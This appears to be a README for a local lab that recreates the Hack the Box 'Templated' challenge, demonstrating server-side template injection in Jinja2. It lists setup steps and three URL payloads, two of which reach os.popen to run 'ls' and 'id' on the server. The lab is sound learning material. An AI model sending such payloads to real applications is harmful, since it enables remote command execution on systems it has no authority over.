# Taking advanatage of SSTI
Recreated the Templated challenge in Hack the Box

## How to run 
1. ```git clone https://github.com/p-cap/HTB-Templated.git```
2. ```python3 demo.py```
3. Copy / paste the payload below

## Payload

http://localhost:5000/{{7*7}}

http://localhost:5000/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls').read()%7D%7D

http://localhost:5000/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D

### Refereence:
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
